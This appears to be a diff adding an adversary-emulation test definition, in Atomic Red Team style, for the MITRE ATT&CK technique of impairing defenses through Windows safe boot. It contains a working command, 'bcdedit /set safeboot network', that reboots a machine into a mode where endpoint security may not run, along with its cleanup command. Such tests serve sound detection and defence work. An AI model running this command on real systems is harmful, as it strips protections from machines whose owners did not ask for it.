@@ -1,0 +1,13 @@
+attack_technique: T1562.009
+display_name: 'Impair Defenses: Safe Boot Mode'
+atomic_tests:
+- name: Safe Mode Boot 
+  auto_generated_guid: 2a78362e-b79a-4482-8e24-be397bce4d85
+  description: Allows adversaries to abuse safe mode to disable endpoint defenses that may not start with limited boot
+  supported_platforms:
+  - windows
+  executor:
+    command: bcdedit /set safeboot network
+    cleanup_command: bcdedit /deletevalue {current} safeboot
+    name: command_prompt
+    elevation_required: true
